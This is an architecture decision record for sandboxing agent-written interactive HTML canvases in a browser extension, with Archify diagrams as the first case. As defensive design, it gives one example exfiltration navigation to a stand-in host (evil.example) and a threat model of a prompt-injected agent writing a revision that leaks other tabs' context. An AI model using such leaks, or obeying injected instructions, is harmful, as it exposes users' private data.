# ADR: `html` canvas — implementation spec, with Archify as the first user

- **Status:** Accepted 2026-10-28 (§6 decided by Brett); amended 2026-11-01 (§2.6: Run scripts once
  per canvas, Brett); amended 2026-11-01 (§2.7: pointing at and asking about an html canvas, Brett)
- **Date:** 2026-10-27
- **Author:** Brett Chien (drafted by Orca)
- **Related:** [canvas](./canvas.md) §3.2 (isolation, `canvas-html-frame.html`, residual risk), §3.3
  (kinds), §3.4 (agent tools), §6 Q2 (`html` on by default) and Q8 (click to run; once per canvas
  since 2026-11-01);
  `katashiro.show_image` and its skill (bytes that skip the model); Archify
  (<https://github.com/tt-a1i/archify>, Apache-2.0, v3.2.0 checked).

> This ADR does not reopen the canvas ADR's decisions on `html`: its own frame, click to run,
> `save`/`selection` refused, the load gate, the stated leak, the banner. It fills in what the
> canvas ADR leaves for "phase 2": how the HTML gets into the frame, what the frame is allowed to
> do, the size cap, and the agent-side path, using one real workload to settle the details.
> It changes three details of canvas §3.2, each marked there with a pointer back here: the `html`
> frame also sends `openLink` (§2.4), its sandbox adds `allow-downloads` (§6 Q2), and a navigation
> whose response never commits is not caught by the load gate at all (§3).
>
> **Amended 2026-11-01 (§2.7, Brett):** 💬 on a selection, `canvas_highlight` and `canvas_inject_css`
> work on `html` canvases, the host may post `highlight` / `css` / `selectionRequest` to the
> running frame besides its one render, and Send error to agent carries a running page's error as
> labelled page-reported data. The places below that said otherwise point to §2.7.

---

## 1. Context

### 1.1 Why now

Archify is an agent skill that turns a typed JSON description (architecture, workflow, sequence,
dataflow, lifecycle, ERD, class, tree, timeline, waterfall) or an answer (an "explainer" page)
into **one standalone interactive HTML file**: pan and zoom, trace a route, focus a node,
upstream/downstream reach, light and dark themes, PNG/SVG/WebM export. It is the kind of output
the canvas ADR lists as what `html` is for (§3.3 "a collapsible timeline", "an animated
explainer"), and it is the first case where a user has asked for it. Katashiro has no `html` kind
yet (`KINDS` in `src/core/canvas-store.js` is `markdown`, `slides`, `image`, `mermaid`).

### 1.2 What Archify output is (measured 2026-10-27 on v3.2.0)

| Fact | Value | Why it matters here |
|---|---|---|
| Size of a native diagram | 0.83–0.88 MB (20 examples) | under the 2 MB text cap |
| Size of an explainer page | 0.52–0.53 MB (4 examples) | under the cap |
| Size of an Architecture Delta | 2.35 MB | over the 2 MB text cap; fits the 4 MB `html` cap (§6 Q1) |
| Script | 2 inline `<script>` blocks (≈ 1 KB + 451 KB), plus JSON data blocks | needs `'unsafe-inline'`: only `canvas-html-frame.html` |
| Network | no `fetch`, XHR, `WebSocket`, `Worker`, `eval`, `new Function`; fonts are `url(data:…)` | works under `connect-src 'none'`, `worker-src 'none'`, `font-src data:` |
| Storage | every `localStorage` access in `try/catch` (its comment names sandboxed frames) | an opaque origin throws; the viewer keeps working |
| URL | reads `location.hash` with `URLSearchParams`, rewrites it with `history.replaceState` | the frame URL carries our nonce (§2.4) |
| Static fallback | the diagram is one `<svg>` already in `<body>`, styled by `<style>` | the "not yet run" view can show the real diagram (§2.3) |
| Links | one outbound `<a href>` (credit), 2 × `target="_blank"` | must go through `openLink`, or the load gate fires |
| Export | `navigator.clipboard.writeText`, download links, `MediaRecorder` | downloads need `allow-downloads`; Copy stays blocked (§6 Q2) |

The CLI (`node archify/bin/archify.mjs`) has no dependencies besides Node ≥ 18. On the agent host
(ECS, no Chrome) `deliver` and `check` pass. `finalize` stops at `browser-check` with
`viewer/chrome-unavailable`, because that gate drives a local Chrome.

### 1.3 Constraints that do not change

- The agent must not emit the HTML as tool-call arguments: 0.85 MB is roughly 250 K output tokens.
  The same rule as `show_image`: **the bytes skip the model**.
- Everything in canvas §3.2 holds. In particular, the `html` frame only ever receives its own
  canvas content, and nothing it posts is stored as the user's words.

## 2. Decision

### 2.1 Store and tools

- `KINDS` gains `"html"`. It is **not** in `PATCH_KINDS`: an `html` canvas is replaced whole.
  Archify, for one, edits its JSON and renders again; find/replace in a 450 KB minified script is
  not a useful edit.
- `canvas_open({kind:"html", title, content})` as for the other kinds. Content must be a UTF-8
  string that parses as an HTML document (no other check: whatever it is, it runs only after a
  click). Cap: **4 MB** for `html`; the other kinds keep 2 MB (§6 Q1).
- **`canvas_read` on an `html` canvas does not return the full content by default.** It returns
  `{version, author, at, bytes, sha256}` and the first 16 K characters, with a line saying it was
  cut. `full: true` returns all of it. The agent's source of truth for an `html` canvas is its own
  input (Archify's JSON), and an unasked 0.85 MB read would fill the context.
- No editor, no `save`, no Send to agent diff, no compare: as the canvas ADR already says for
  `html` (§3.2, §3.7, §3.10). The glow on an agent write is skipped too (there are no text blocks
  to compare). *Amended 2026-11-01 (§2.7):* 💬 on a selection and `canvas_highlight` (and
  `canvas_inject_css`) **are** available — in the static view as for markdown, while the scripts
  run through the host's requests; Send to agent (the edit diff) stays N/A, since there is no editor.
- Mirroring to the local folder writes `<slug>.html`, under the same rules as `.md`.

### 2.2 Getting the file in: a script, not the model

The `katashiro-show-image` skill already posts a local file to the OpenAB facade
(`127.0.0.1:8848`) with `curl`, so 5 MB of image never goes through the model. The same pattern
ships for canvases as **`skills/katashiro-canvas-file/scripts/canvas-file.sh <file> --kind html
--title "…" [--id <canvasId>]`**: it reads the file, builds the `katashiro.canvas_open` arguments
with `jq --rawfile`, calls the facade, and prints one line (`opened canvas cv_… v3 (html, 846 KB)`).
With `--id` it writes a new revision of that canvas. The script works for any kind; `html` is the
one that needs it.

### 2.3 Before Run scripts: the static view (in `canvas-frame.html`)

Per Q8, an `html` canvas first renders in `canvas-frame.html`, which runs no agent script. That
view uses its own DOMPurify profile, not the markdown one:

- `WHOLE_DOCUMENT`, then the frame shows the sanitized `<body>` inside a **shadow root** with the
  document's `<style>` elements copied into it. That keeps the page's CSS away from the frame's
  own, and lets Archify's pre-rendered SVG look like the real diagram.
- Kept: `<style>`, `style` attributes, SVG. Removed: `<script>`, event handlers, `<form>`,
  `<iframe>`, `<object>`, `<embed>`, `<meta http-equiv>`, `<base>`, `<link>`, `target`.
  Images: `data:` and `blob:` only (the frame's CSP would block the rest anyway).
- Links go through `openLink`, as everywhere in this frame.
- For the implementation:
  - **Do not reuse the mermaid profile (`SVG_DP`).** It adds `foreignObject`. The vendored
    DOMPurify drops `use`, `animate`, `set` and `foreignObject` by default, and this profile keeps
    it that way. If arrow markers need `use`, add it only with a hook that keeps an `href` /
    `xlink:href` of the form `#id` (same document) and removes any other.
  - The `<style>` elements copied into the shadow root come from the **sanitized** document, not
    from the raw content.
  - Sanitize with `RETURN_DOM` and move the resulting nodes into the shadow root. Do not
    serialize and set `innerHTML` again: a second parse is where mutation XSS lives.

The header shows **▶ Run scripts** and, beside it, a compact chip: 「靜態檢視 · 按 ▶ Run scripts
互動」 (§2.6; until 2026-11-01 a full line under the header). What running allows — *this canvas's
script can then send what it contains, and what you type into it, out of the browser; the
authorization lasts for this canvas until ⏹* — is the chip's and the button's tooltip, and reaches
screen readers through `aria-describedby`. `canvas-frame.html`'s meta CSP `script-src 'self'` is
the backstop if the profile ever lets a script through.

### 2.4 After Run scripts: `canvas-html-frame.html`

- **Page:** `canvas-html-frame.html` is a sandbox page with one script of ours,
  `src/canvas/canvas-html-frame.js`, and no other content (since §2.7, `src/core/canvas-core.js`
  is loaded before it for its pure block-matching helpers, taken before any page script runs, the
  global removed again). The manifest sandbox CSP gains
  `'unsafe-inline'` in `script-src` (canvas §3.2 already plans it). `canvas-frame.html` keeps its
  meta `script-src 'self'`, so the loosening reaches only this page.
- **iframe:** `sandbox="allow-scripts allow-downloads"` (§6 Q2),
  `src="canvas-html-frame.html#k=<nonce>"`. The frame exists only after Run scripts, so a download
  is possible only after that click. No clipboard permission: `navigator.clipboard` stays blocked.
  The key form `k=` matters: Archify parses the hash as `URLSearchParams` and ignores keys it does
  not know. The frame reads the nonce once, before anything else runs.
- **One render per load.** The frame posts `ready{nonce}`; the host posts
  `render{nonce, kind:"html", content, version}` once. The frame then runs
  `document.open(); document.write(content); document.close()`, which runs the page's inline
  scripts in this document, under this page's CSP. `document.open` drops the listeners our script
  added, so after `close()` our script adds back, in this order:
  1. capture-phase `click` / `auxclick` on `window` → `openLink{url}` (Archify's credit link and
     anything the page draws). This is a convenience: page script can stop it, and the load gate
     is what actually holds;
  2. `securitypolicyviolation` → `error{msg}` (capped, `textContent` only on the host, as §3.2);
  3. then `rendered{version}`.
  A second `render` is ignored. A new revision (run at once under the canvas's grant, §2.6), or
  Run scripts again, is a host-caused reload with a new nonce (§3.2), followed by a new `ready`.
- **Host invariant: one `render` per nonce, and nothing else.** For an `html` frame the host posts
  exactly one message per nonce, the `render` answering that nonce's `ready`. It never posts a
  second `render`, a theme change, a scroll request or anything else to it. That is what bounds
  the gaps below: whatever the frame's script does, it holds this one revision's content and
  nothing more. *Relaxed 2026-11-01 (§2.7):* after the render, also `highlight{…}`, `css{…}` and
  `selectionRequest{reqId}` — the agent's own strings for the content the same agent wrote, or a
  bare request. The bound still holds: no user data, theme, history or other canvas ever goes in.
- **The load gate and `document.close()`.** Chrome may or may not fire the iframe's `load` event
  again when a `document.open`/`close` pair finishes. The gate is a plain counter
  (`createLoadGate` in `src/core/canvas-core.js`), so a wrong guess either way is a hole: an
  expectation nobody uses would later swallow the frame's own navigation, and a missing one would
  drop a good frame. So:
  1. **Pin it with a test, then hard-code it.** The implementation PR includes a test (e2e, real
     Chrome) that shows whether the event fires, and the host either always or never expects
     that load. No runtime "if it fires".
  2. **If it fires, the expectation is single-use.** It is armed when `render` is posted and
     covers that one load. It is dropped on `rendered{version}` or after a timeout (set in the
     implementation, a few seconds), whichever comes first, and never carries over to a later
     load. The same test pins the order in which the host sees that load and `rendered`.
     *(§8, 2026-11-01: the load comes after `rendered`, so it is dropped by that load or the
     timeout, not by `rendered`.)*
  3. **Known gap:** page script that navigates during `document.write()`, before `close()`, races
     that load. The host may count its navigation as the expected load, or the expected load may
     be counted as the navigation. The cost is detection only: the frame may not be dropped, but
     under the invariant above it has nothing more to leak than the content it already holds
     (canvas §3.2 already states that this content can leave).
- **Known gap: violations during the first run are not reported.** `document.open` drops our
  `securitypolicyviolation` listener, and it is added back only after `close()`. A violation
  raised by the page's inline script while `write()` runs it (a blocked `eval`, `Worker` or
  `fetch` at start-up) is therefore not sent as `error{}`. If that leaves the page unable to
  finish, the user sees a broken canvas with no message. The host does still get `rendered`
  (it comes from our script, not the page's), so this is accepted as a limitation and not
  worked around in this version.
- **Deep links** (`#focus=…`, `#route=…`) are not supported in this version: the host does not
  pass a fragment, and Archify's `replaceState` rewriting our hash is harmless (the nonce was
  already read).
- Messages accepted from this frame: `ready`, `rendered{version}`, `error{msg}`, `openLink{url}`,
  and (§2.7) the answers `highlighted{reqId, ok, tag?, text?, error?}`, `styled{reqId, sheets}` and
  `pageSelection{reqId, text, truncated?}`. Everything else is dropped, as in canvas §3.2.

### 2.5 Agent side: Archify into a canvas

A second skill, **`skills/katashiro-archify`**, sits on top of Archify's own skill (installed with
`npx skills add tt-a1i/archify`; Katashiro does not vendor Archify):

1. Author and render as Archify's skill says, in a scratch folder (`/tmp/archify/<slug>-<ts>/`).
2. Run `finalize`. On a host with no Chrome, a run whose only failure is `browser-check` with
   `viewer/chrome-unavailable` (and `validate`/`deliver`/`check` pass) is accepted, and the reply
   says that the browser gate did not run. Any other failure is repaired as Archify's skill says.
3. Upload with `canvas-file.sh <slug>.html --kind html --title "…"` (`--id` for a new revision).
4. Optional visual check: `katashiro.screenshot` of the canvas tab. Before Run scripts it shows the
   static SVG (§2.3), which is enough to check the layout. This stands in for Archify's
   `browser-check` and is reported as an automated check, not a perceptual review.
5. Tell the user to press ▶ Run scripts for pan/zoom, tracing and themes. The page itself never
   says so (§2.6): Katashiro shows its own hint, and the page must read well without its scripts.

The update check Archify's CLI does (a GET of its stable manifest) runs on the agent host, not in
the browser. The HTML itself has none.

### 2.6 Run scripts once per canvas (Brett, 2026-11-01)

Decided by Brett on 2026-11-01 11:38 TPE (Katashiro chat message
`acpmsg_460e0e3d-1560-47a4-83bd-5edaa6e0e7e4`); it replaces canvas §6 Q8's "a new revision needs a
new click".

- **The grant is per canvas id and persisted.** ▶ Run scripts stores
  `canvas:<id>:runGrant = { conversationId, version, at }` in `chrome.storage.local`
  (`CanvasStore.grantRun`, under the canvas lock; refused if the canvas moved or was deleted since
  the tab read it, or `html` is off). Reloads, reopening the tab, every other tab of the canvas
  (they follow the key through `storage.onChanged`) and the agent's new revisions then run directly,
  never through the static view. A grant **holds** only while its `conversationId` is the canvas's
  and `canvas:htmlEnabled` is not `false` (`CanvasStore.runGrantHolds`).
- **Revoked by:**
  - ⏹ Stop scripts — stop is revoke, in every tab of that canvas;
  - moving the canvas to another conversation (`CanvasStore.move`, the user's ↪ and
    `canvas_move` alike): another agent writes next. The key is removed under the canvas lock
    before the meta changes, and the `conversationId` check is the second line;
  - deleting the canvas (`CanvasStore.remove` removes the key with the rest);
  - Settings → html 畫布 off: the side panel removes every grant (`revokeAllRuns`), each canvas tab
    its own, and a grant never holds while off — turning it on again runs nothing by itself;
  - the load gate dropping the running frame (the page navigated itself): a reload would otherwise
    run it again unasked. Not in Brett's list; added because a page that tries to leave is the case
    the gate exists for.
- **Auto-run notice.** When a revision newer than the grant's `version` runs because of the grant
  (a new revision in an open tab, or one written while no tab was open), the header's notice line
  says 「v3 已自動執行（這個畫布已授權；⏹ 可撤回）」 (`textContent`), and the grant's `version`
  moves up (`noteRun`). The version is in the text so the user knows the code changed.
- **Compact hint.** The full lines under the header are gone: a chip beside the button says
  「靜態檢視 · 按 ▶ Run scripts 互動」 or 「▶ script 執行中」 (amber); the risk and how long the
  grant lasts are in the tooltip and `aria-describedby` (§2.3). There is no confirm dialog on the
  first click (there was none before either): the button's label and tooltip say what it does, and
  a modal would be clicked through like any other.
- **Unchanged:** the host invariant (one `render` per nonce, nothing else, §2.4; since relaxed by
  §2.7 B for `highlight` / `css` / `selectionRequest` only) — an auto-run
  revision is a fresh frame load with a new nonce, never a second `render` into a running frame;
  the sandbox (own frame, `allow-scripts allow-downloads` only), the CSP (no network, no eval,
  no workers), the load gate, the banner, and act mode not gating `html` (canvas §3.4).
- **Accepted risk: bait and switch.** A harmless first revision earns the grant; a later revision
  from the same conversation's agent can behave differently, and runs without a click. Accepted
  because a click per revision was not a real review either — nobody reads a 450 KB script before
  pressing ▶ — so it added friction without adding a check. The boundary that holds is the
  sandbox above, which a revision cannot change; what a later revision can do is what the first
  could have done (canvas §3.2 residual risk). The notice makes the change of code visible, and a
  move to another conversation (another agent) asks again.
  What the per-revision click also held back, and this gives up, is **when** the code runs and
  **what** it carries: a granted canvas reopens the act-mode bypass canvas §3.2 describes. An agent
  steered by prompt injection later in the same conversation can put context from other tabs into a
  new revision that sends it out with no action from the user; a navigation leaves before the load
  gate revokes the grant, and the notice comes after the run, not before it.
- **Pages do not tell the user to press Run scripts.** `canvas_open`'s description and the
  `katashiro-canvas-file` / `katashiro-archify` skills say: no "press Run scripts" text or
  placeholders in the page (Katashiro shows its own hint, and the page's would stay on screen after
  the scripts run), and the page must read well without its scripts (content pre-rendered in the
  HTML; script only adds interaction).

### 2.7 Pointing at and asking about an `html` canvas (Brett, 2026-11-01)

**Decision.** Brett, in Katashiro chat (`acpmsg_ebd08ef6-972e-4749-b70d-996d398544dd`, 2026-11-01
11:38 TPE): *"we should enable these"* — 💬 on a selection, Send to agent and `canvas_highlight` on
`html` canvases. An Archify diagram is the canvas a user most wants to ask about ("what is this
node?") and the agent most wants to point into, and §2.1 had turned all of it off. The design
splits on the two frames, because their trust differs.

**A. The static view (before Run scripts, `canvas-frame.html`).** It runs no page script (§2.3: the
sanitized document in a shadow root, under `script-src 'self'`), so it gets the markdown view's
trust and the markdown view's features:

- **💬 Ask agent / 📨 To chat input on a selection**, exactly as canvas §3.7 (popover, armed Enter,
  the same refusals). The frame's `selection{}` reads `document.getSelection()`, which in Chrome 155
  reaches into the open shadow root (checked). The host line names the kind and where:
  `[canvas "X" (<id>) v3 (html), text selected by the user in 「Overview」 in the page shown without
  its scripts — as rendered, not the html source; an html canvas is rewritten whole with canvas_open]`
  (`CanvasCore.composeAskAgent({kind})`). `where` carries the heading path (the page's `h1`–`h6`)
  and never source lines: the shown DOM does not map to lines of the stored page.
- **`canvas_highlight`.** A *block* of an html page is `CanvasCore.htmlBlocks`: markdown's blocks (p,
  li, h1–h6, tr, pre) plus where pages keep their text — blockquote, dt / dd, figcaption, caption,
  summary, div and the sectioning elements, and SVG `<text>` (a diagram's labels, Archify's nodes).
  As in markdown a block's text is its **own** text (words in a nested block belong to that one), so
  a `div` wrapping paragraphs never matches their words and `find` stays unambiguous. script, style,
  template, title / desc, head and our own notes are not content; blocks that are not laid out
  (`display: none`) are left out. Matching is `CanvasCore.matchBlock`, unchanged; a heading anchor
  is an h1–h6's text. The glow and the note are the markdown ones (`CanvasCore.POINT_CSS`, put into
  the shadow root, where `canvas-frame.css` does not reach); an SVG label's note goes before the
  whole `<svg>` (a `<div>` inside it would not show). Outline and background only, as §3.10.
- **`canvas_inject_css`.** The agent's sheet goes into the shadow root (through
  `CanvasCore.cssForShadow`, so `:root` is the moved `<html>`), with the tool's usual refusals.

**B. While the scripts run (`canvas-html-frame.html`).** The page's script runs in the same
document as our listener, so anything that frame says is **page-reported**: it may be what we asked
for, or whatever the page chose to send. Since §2.6 a granted canvas runs at once on open and on
every revision, so this is the path the user usually sees; the static view (A) is what an
ungranted canvas, or one after ⏹ Stop scripts, shows. An auto-run revision is a fresh frame: the
agent's sheets are posted again after its `rendered{}`, a glow is not carried over.

- **The host invariant is relaxed, not dropped.** Besides the one `render`, after `rendered{}` the
  host may post exactly three things, each rebuilt field by field by `CanvasCore.htmlFramePost`
  (the one place every post to that frame goes through; `toFrame()` drops the rest):
  `highlight{reqId, find|heading, label, durationMs}`, `css{reqId, sheets}` and
  `selectionRequest{reqId}`. Rationale: highlight and css carry only **agent-chosen strings about
  content the same agent wrote**, so the page learns nothing it could not already hold (the agent
  could have written the label into the page itself); selectionRequest carries nothing. The host
  still never posts user data (no note, no input text, no edits), the theme, other versions or other
  canvases' content. Our script re-installs its `message` listener after `document.close()`, like
  the link and CSP listeners (§2.4), and applies them: `CanvasCore.htmlBlocks` + `matchBlock` over
  the live `body` with the same glow and note (`canvas-core.js` is loaded before our script; its
  helpers are taken before any page script runs, and the global is removed), and one `<style>` of
  ours for the sheets. It answers `highlighted{}` / `styled{}`.
- **Best effort, and said so.** Page script can remove our listener, our style or our note, or
  answer in our place. Then the feature does not work, which is acceptable; the tool result says
  so: `canvas_highlight` fails with "the html canvas's running page did not confirm it … nothing is
  known to be shown" when no `highlighted{}` arrives in 5 s, and `canvas_inject_css` succeeds with
  a note "… did not confirm it; it may not show" after 2 s (the sheets stay in the host and go to
  the next frame either way). A forged `highlighted{ok:true}` only makes a wrong "shown" claim about
  the page's own frame; its `text` is quoted to the agent like any canvas text (≤ 200 characters).
- **💬 on a selection: the trigger is the user's, in the host.** The running frame never sends
  `selection{}` (its script could forge one at any time, and a forged selection behind a
  host-drawn 💬 would put page text into a push). Instead the header has **📨 頁面選取** while the
  scripts run: an `isTrusted` click in `canvas.html` posts `selectionRequest{reqId}`, and the frame
  answers `pageSelection{reqId, text, truncated?}` (≤ `SELECTION_MAX`, cut and flagged). The text
  goes **into the side panel's input box, never sent**: framed as page-reported data
  (`CanvasCore.composePageSelection`: the host line `[canvas "X" (<id>) v3 (html, scripts running):
  text the page reports as selected — page-reported by the canvas's own script, not checked by
  Katashiro]`, then the text in the §3.7 fence; refused whole when cut or when it would not fit the
  panel's 20 KB cap). The user reads it, adds a question and sends it. It is not armed for Enter (as
  📨 To chat input is): page text should be read before it goes out. A forged answer can only change
  text the user sees before sending. No answer in 3 s → "畫布頁面沒有回答…" and nothing goes in.
- **Send error to agent.** The running frame's `error{msg}` now goes with the button, as data:
  clipped (`clipError`, 500 characters), fenced, under a header saying it is page-reported
  (`renderErrorHeader({pageReported})`: "… reported an error while its scripts ran — the message
  below is page-reported (the canvas's own script can write it), not checked by Katashiro"), and
  the banner says 畫布頁面回報錯誤. Still only on the user's click in the host. This replaces canvas
  §3.7's "host-composed text only" for `html`: the agent wrote the page, so the page's error text
  is the most useful thing to send, and the fence and the label are what every push relies on. The
  static view's errors come from `canvas-frame.html` (no page script) and go as for markdown.
- **Send to agent (the edit diff)** stays N/A: an `html` canvas has no editor.
- **Unchanged:** the per-frame allow-lists with their nonce checks, the load gate, compare refused
  for `html`, no editor, no `armKeys` to the running frame.

**Risk, in short.** Nothing new leaves the browser: the running page already holds its content
(§3), and the new host → frame messages add only agent strings about that content. Nothing new
reaches the agent unasked: every frame → agent path still needs the user's click in the host and is
fenced and labelled; the only text that goes into the user's own message (📨 頁面選取) sits in the
input box, labelled, until the user sends it.

## 3. Consequences

### Positive

- One frame design serves Archify and anything else that produces a standalone page (calculators,
  sortable tables, explainers), which the canvas ADR already wanted.
- The static view is useful by itself: most of the time an Archify diagram is read, not driven.
- Nothing from Archify is vendored, so its weekly releases need nothing from Katashiro.

### Negative / tradeoffs

- After Run scripts the leak described in canvas §3.2 applies to this content: script can navigate
  the frame with data in the URL, or use WebRTC. An Archify file is produced by a CLI, but
  Katashiro cannot tell it apart from hand-written HTML, and the labels in it come from whatever
  the agent read. It is treated like any other `html` canvas.
- **A navigation may never be noticed.** Canvas §3.2 says the load gate notices a self-navigation
  "only afterwards". It can be worse: `location = "https://evil.example/?d=…"` sends the request
  whether or not the gate exists, and if the server answers `204` or with
  `Content-Disposition: attachment`, the navigation never commits, no `load` fires, and the gate
  never sees it. The data has left and the frame stays. `allow-downloads` does not change this
  (the request goes out either way); it is a property of the leak canvas §3.2 already accepts.
- **Script can put a file on the user's disk.** With `allow-downloads`, after Run scripts the
  page can start a download with any name and content, with no further click (Chrome's own
  download UI and its multiple-download prompt still apply). This is the same kind of risk as the
  clipboard one (§6 Q2): a planted file the user may later open or run. It is accepted because it
  needs the Run scripts click (once per canvas since §2.6), the file does not run by itself, and
  Archify's exports need it.
  If it proves a problem, §6 Q2's option (c) (a host-mediated download with a confirm card) is
  the fallback.
- **Later revisions run without a click** (§2.6, 2026-11-01): a revision that differs from the one
  the user first ran (bait and switch) runs under the same grant. Accepted there; the header
  announces each such revision with its version.
- 0.85 MB a revision with the 10-version history is about 8.5 MB of the 200 MB budget per canvas;
  a canvas at the 4 MB cap keeps up to 40 MB.
- Archify's Copy button fails (the clipboard stays closed, §6 Q2); its exports work.
- Two new skills to keep in step with the tools.

## 4. Alternatives considered

- **A dedicated `archify` kind** (agent sends the JSON; `canvas-frame.html` runs a vendored Archify
  renderer, no click, no agent script). Rejected for now: 19 renderer modules import Node built-ins
  (`fs`, `path`, …), so it would be a port, not a vendor drop, and it would have to follow a fast
  release cadence. Worth revisiting if Archify ships a browser build.
- **Screenshot only** (agent renders to PNG, `show_image`). The agent host has no Chrome, and the
  result loses everything interactive, which is Archify's point.
- **Nested `srcdoc` iframe** instead of `document.write`. The sandbox CSP has `frame-src 'none'`,
  and a second frame level adds a second load gate for no gain.

## 5. Scope

In: `html` kind, the two frames' parts described above, `canvas-file.sh`, `katashiro-archify`.
Out: deep links into an Archify view, editing `html`, `canvas_patch` for `html`, print for `html`,
any vendored Archify code.

## 6. Decisions (Brett, 2026-10-28)

1. **Size cap for `html`: 4 MB**, for `html` only; the other kinds keep 2 MB. Archify's Delta view
   (2.35 MB) fits. Rejected: 2 MB for every kind.
2. **Downloads and clipboard in the `html` frame: (b) `allow-downloads` after Run scripts** (§2.4).
   Plain `allow-scripts` (canvas §3.2) blocks Archify's PNG/SVG/WebM export and Copy; with (b) the
   exports work. A download goes to disk, not the network, and only after the click that runs the
   script. The clipboard stays closed (writing it would let a page plant a command for the user to
   paste). Rejected:
   - (a) Nothing extra: those buttons fail; the host's own screenshot still works.
   - (c) A host-mediated `download{name, mime, bytes}` message with a confirm card. More code, and
     a new frame → host message with bytes.
3. **`canvas_read` default for `html`: 16 K characters plus metadata**, `full: true` for all of it
   (§2.1). Rejected: full content like the other kinds.

## 7. As implemented (2026-10-28)

- **The `document.close()` load, pinned:** in Chrome 155, `document.open`/`write`/`close` in
  `canvas-html-frame.html` does **not** fire the iframe's `load` again. *Re-pinned 2026-11-01 (§2.7),
  see below: it does when the document has finished loading, and the frame now waits for that.* `e2e/cases/html-canvas.mjs`
  counts the iframe's loads from the moment it is created (exactly one: the `src`), and `canvas.js`
  hard-codes `HTML_WRITE_FIRES_LOAD = false`: the host never expects that load. The single-use
  expectation of §2.4 point 2 is implemented (`createLoadGate().arm()` / `disarm()`, unit-tested)
  and stays unused unless a later Chrome changes this; the e2e then fails and the constant flips.
- **Host invariant, enforced in one place:** `toFrame()` drops every message while the html frame is
  mounted; its one `render` goes out through `sendHtmlRender()`, once per nonce. The e2e checks the
  page receives no message after its render (◐ 顯示變更 toggled meanwhile). *Since §2.7, `toFrame()`
  passes `highlight` / `css` / `selectionRequest` through `CanvasCore.htmlFramePost` once the page
  has rendered, and drops everything else; the e2e checks the page gets nothing else.*
- **Per-frame allow-lists** (`CanvasCore.acceptFrameMessage` `profile`): `canvas` (canvas-frame.html),
  `htmlStatic` (canvas-frame.html showing an html canvas: `ready`, `rendered`, `error`, `openLink`
  only) and `html` (canvas-html-frame.html: the same four, `rendered{version}` without `seq`).
- **Static view, two findings from real Archify output:**
  - DOMPurify drops a whole `<style>` whose text contains `<` followed by a letter (its mXSS check).
    Archify's main sheet (200 KB) has "on `<html>`" in a comment, so the static view lost all its
    CSS. An `uponSanitizeElement` hook, which runs before that check, rewrites the `<style>`'s text
    with `CanvasCore.cssForShadow`, one pass that tracks comments, strings and escapes (#208): each
    `<` becomes the CSS escape `\3C ` (same character), an escaped `\<` becomes `\3C ` too, and a
    top-level CDO `<!--` becomes a space (CSS ignores it; an escape would break the next rule, and
    nothing at all could join `/<!--*` into a comment opener). The
    node's text is changed in place; nothing is parsed again. After it, Archify's static view matches
    the run view except for what script draws. Known edge: a custom property value holding a bare
    `<` delimiter now holds an escaped `<` identifier instead.
  - The sanitized document's `<html>` element itself (head with the `<style>`s, body, attributes
    such as `data-theme`) is moved into the shadow root, so `html[data-theme=…]` and
    `[data-theme]` rules match. A shadow tree has no root, so the same pass maps `:root` in
    selectors (any case, also right after a comment, as in Bootstrap's `/*! … */:root`) to
    `:is(html,:nth-child(0))` (#208): `:nth-child(0)` matches nothing and only keeps `:root`'s
    (0,1,0) specificity, so `:root{…} html{…}` resolves as on the page.
  - `SANITIZE_DOM` stays on, so an `id` that names a `document` property (`id="title"`,
    `id="forms"`) is removed and CSS keyed on it does not apply in the static view.
- **CSP violations after `close()` are reported:** e.g. a remote `<img>` blocked by `img-src`
  loads after `close()`, when our listener is back, and comes back as `error{}`. Only violations
  raised while `write()` runs the inline scripts are lost (§2.4).
- **Header:** ▶ Run scripts becomes ⏹ Stop scripts while the scripts run (back to the static view).
  A line under the header said which state the canvas is in and what running allows; since §2.6 a
  chip beside the button says the state, and the tooltip what running allows.
- **Setting (canvas §6 Q2):** Settings → html 畫布 開/關 (`canvas:htmlEnabled`, on unless `false`).
  Off: the store refuses `canvas_open` kind html, canvas tabs hide Run scripts, and a running frame
  goes back to the static view; since §2.6 every canvas's grant is revoked too.
- **Download:** the header's ⬇ saves an html canvas as `.html` (from the host, not the frame).
- **`canvas_read`'s 16 K head** never ends between the halves of a surrogate pair (#208).
- **`canvas-file.sh`** refuses a text file that is not UTF-8 (checked with `iconv` when present).
- **canvas_inject_css** is refused for an html canvas (it styles itself), like `canvas_highlight`.
  *Superseded 2026-11-01 by §2.7: both work on html canvases.*

## 8. As implemented (2026-11-01, §2.7)

- **The `document.close()` load, re-pinned.** The 10-28 pin (no second load) held only because the
  host's `render` reached the frame before its first `load`: a race. Loading `canvas-core.js` before
  our script (§2.7) made it lose in about half the e2e runs — `document.open` on a document that has
  finished loading **does** fire the iframe's `load` again, and the gate dropped the frame. Now the
  frame posts `ready` only after its own `load` (plus a task), so the write always comes after it
  and always fires one more load. `canvas.js` sets `HTML_WRITE_FIRES_LOAD = true`: the single-use
  expectation of §2.4 point 2 is armed with the render and used by that load; it is **not** dropped
  on `rendered{}` (the frame posts it right after `close()`, before the load arrives) but by the
  load itself or the 5 s timer. `e2e/cases/html-canvas.mjs` pins exactly two loads (the `src`, the
  write); a self-navigation after them is still dropped (same test). The known gap of §2.4 point 3
  (a navigation during `write()`) is unchanged.
- The rest is as §2.7 describes; `e2e/cases/html-canvas.mjs` covers each part in real Chrome.
- **Mirror:** `<slug>.html`, conflict files `<slug>.katashiro-<time>.html`; the file record keeps
  `ext: "html"` so every path check knows the extension.

